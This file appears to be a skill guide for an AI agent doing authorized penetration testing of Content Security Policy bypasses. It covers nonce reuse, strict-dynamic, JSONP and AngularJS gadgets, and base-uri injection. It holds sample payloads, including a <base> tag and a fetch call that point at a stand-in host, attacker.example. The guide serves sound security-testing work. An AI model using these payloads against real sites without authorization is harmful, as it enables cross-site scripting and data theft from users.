---
name: csp-bypass
description: >-
  Use when authorized testing has identified an XSS primitive or HTML
  injection that does not fire because of Content Security Policy, and you
  need to determine whether the deployed CSP actually constrains the
  primitive - covers nonce reuse, strict-dynamic gadgets, allowlisted JSONP/
  Angular endpoints, base-uri tricks, script-src `self` exploitation, and
  CSP-Report-Only as evidence.
---

# CSP Bypass

CSP is not a detection problem; it is a constraint problem. The XSS
primitive (`innerHTML` sink, attribute injection, dangling markup) is
already found by the time this skill applies. The question is whether the
deployed CSP turns the primitive from "exploitable" to "limited" or to
"not exploitable at all". Misdeployed CSPs are common; perfectly tight
CSPs are rare.

## Workflow

1. Read `../../references/scope-safety.md` and the Cross-Site Scripting
   section of `../../references/high-signal-must-tests.md`.
2. Capture the CSP header on the affected response, and the
   `Content-Security-Policy-Report-Only` header if present.
3. Parse each directive (`script-src`, `object-src`, `base-uri`,
   `default-src`, `frame-ancestors`, `style-src`, `connect-src`).
4. Identify the available gadget:
   - **nonce reuse / weak nonce**: predictable, reused across requests,
     or copy-pasteable from earlier-loaded scripts.
   - **strict-dynamic**: any allowlisted script can call
     `document.createElement('script')` with attacker URL.
   - **allowlisted hosts hosting JSONP**, AngularJS, or arbitrary
     uploads: classic CSP-evading endpoints (Google Analytics, Google
     Maps, Microsoft CDN, AJAX CDN, jQuery CDN, Tencent CDN).
   - **`'unsafe-eval'` or `'unsafe-inline'`** in `script-src`: bypass
     trivial; framework template injection becomes XSS.
   - **missing `object-src 'none'`**: `<object data="javascript:...">`
     bypasses script-src on older browsers.
   - **missing `base-uri 'self'`**: `<base>` injection redirects all
     relative script URLs to attacker host.
5. Validate with a unique-marker payload that exfiltrates to an owned
   domain or runs `alert(document.domain)`.
6. Write findings with `../../references/finding-output.md`. Include
   the CSP header verbatim, the gadget used, and the payload that
   bypassed it.

## Where To Look

- The deployed CSP header (response headers; meta tags occasionally).
- `Content-Security-Policy-Report-Only` - lower priority but useful;
  if violations would also bypass the enforced policy, report it.
- The JS bundle for: dynamic-string runtime evaluation (the JS
  `eval` builtin, the Function constructor with attacker-influenced
  arguments), template engines that compile at runtime, AngularJS
  expressions (`ng-app` v1.x).
- The allowlisted hosts in `script-src` and `default-src`: are any
  known to host JSONP, Angular, or wide-content user uploads?
- The `<base>` tag: if absent, `base-uri 'self'` is needed.
- Inline scripts and styles relying on nonce/hash; check predictability
  and reuse.

## Common Patterns

- Nonce generated per session instead of per response, allowing reuse
  across many pages.
- `script-src 'self' https:` - effectively any HTTPS host with a
  script.
- `script-src 'self' *.googleapis.com` - Google APIs include JSONP
  endpoints serving attacker-controlled callback names.
- `script-src 'strict-dynamic' 'nonce-xxx'` but the allowlisted script
  loads attacker content under attacker control.
- `script-src` set but `object-src` left as `default-src` while
  `default-src` allows wider sources.
- `frame-ancestors` missing entirely - allows clickjacking even with a
  strict script-src.
- `report-uri` going to a system the tester can read; sometimes leaks
  internal hostnames.

## Protection And Bypass Themes

- For nonce reuse, fetch the page twice and diff the nonce; if equal,
  the bypass is trivial.
- For strict-dynamic gadgets, search public databases of known
  bypassable scripts on common CDNs.
- For Angular gadget, find an allowlisted host with an old Angular
  bundle; inject `<div ng-app>{{constructor.constructor('alert(1)')()
  }}</div>` (older Angular only).
- For JSONP gadget, find an allowlisted endpoint that reflects a
  callback name; inject `<script src="https://allowed.example/jsonp?
  callback=alert(1)//"></script>`.
- For `<base>` injection, inject `<base href="https://attacker.example
  /">` before a relative-URL script tag.
- For `'unsafe-inline' 'unsafe-eval'`, no bypass needed - the CSP
  permits the primitive directly.
- For meta-tag CSP, an HTML injection before the meta-tag's position
  in the document can override or remove it.

## Safe Validation

- Owned exfil domain with unique marker. Payload should be the
  minimum that proves execution under the deployed CSP - typically
  `fetch('https://attacker.example/?<marker>')` or
  `document.title='<marker>'`.
- Do not exfiltrate cookies, tokens, or user data.
- One bypass per finding. Do not enumerate every theoretically
  bypassable directive on the same page.

## Anti-Patterns

- Reporting "no CSP" as a finding without showing a working XSS or
  HTML-injection primitive on the same page.
- Reporting `'unsafe-inline'` as a finding without showing an
  injection sink.
- Building a complex chain when a single directive (e.g.
  `'unsafe-eval'`) already bypasses; report the simpler path.
- Reporting a CSP weakness on a static asset that contains no user
  input.
